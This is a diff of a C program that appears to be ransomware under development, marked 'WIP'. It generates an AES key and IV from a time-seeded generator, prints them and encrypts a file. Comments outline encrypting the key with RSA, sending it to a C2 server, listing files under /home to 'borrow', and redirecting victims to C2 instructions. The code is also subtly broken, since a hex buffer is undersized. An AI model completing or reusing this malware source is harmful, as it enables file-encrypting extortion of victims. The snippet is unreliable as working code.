@@ -21,14 +21,28 @@ int main(){
     //Generate AES key and IV
     srand((unsigned int)time(NULL));
 
-    uint8_t key[32];
-    generateRandomKey(key, sizeof(key));
+    size_t key_length = 32;
+    uint8_t key[key_length];
+    generateRandomBytes(key, sizeof(key));
 
-    uint8_t iv[16];
-    generateRandomIv(iv, sizeof(iv));
+    size_t iv_length = 16;
+    uint8_t iv[iv_length];
+    generateRandomBytes(iv, sizeof(iv));
 
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
+
+    //Convert key and iv to string
+    char key_string[key_length * 2 + 1], iv_string[iv_length];
+    bytesToHexString(key, key_length, key_string);
+    bytesToHexString(iv, iv_length, iv_string);
+    printf("%s\n", key_string);
+    printf("%s\n", iv_string);
+    encryptFile(ctx, "a.txt");
+    /*
+    //Encrypt the AES key with the RSA public key
+
+    //Send the encrypted AES key and iv to C2
 
     //List all the files we want to borrow ;)
     const char *path = "/home";
@@ -47,13 +61,9 @@ int main(){
     }
     freePathList(&pathList);
 
-    //Encrypt the AES key with the RSA public key
-
-    //Send the encrypted AES key to C2
-
 
     //Redirect to C2's web page for instructions
-
+    */
     return 0;
 }
 //WIP
